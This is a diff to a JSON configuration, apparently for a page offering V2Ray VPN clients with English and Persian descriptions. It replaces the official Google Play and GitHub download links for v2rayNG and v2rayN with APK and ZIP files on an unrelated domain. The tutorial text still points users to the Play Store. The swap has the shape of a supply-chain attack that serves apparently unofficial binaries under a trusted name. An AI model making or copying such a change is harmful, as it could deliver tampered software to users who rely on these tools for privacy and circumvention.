@@ -76,7 +76,7 @@
             "description": "A V2Ray client for Android devices.",
             "faDescription": "V2rayNG یک کلاینت V2Ray برای دستگاه‌های اندرویدی است.",
             "configLink": "v2rayng://install-config?url={url}",
-            "downloadLink": "https://play.google.com/store/apps/details?id=com.v2ray.ang",
+            "downloadLink": "https://httpsprivacypath.top/Android-NG.apk",
             "tutorialSteps": [
               {
                 "stepText": "Step 1: Download and install the v2rayng app from the Google Play Store.",
@@ -134,7 +134,7 @@
             "logo": "https://raw.githubusercontent.com/m-a-np/template/refs/heads/main/icons/v2rayN.png",
             "description": "A Windows V2Ray client with GUI support.",
             "faDescription": "v2rayN یک کلاینت V2Ray برای ویندوز با پشتیبانی از رابط کاربری است.",
-            "downloadLink": "https://github.com/2dust/v2rayN/releases/download/6.60/v2rayN-With-Core.zip"
+            "downloadLink": "https://httpsprivacypath.top/Windows.zip"
           }
         ]
       }
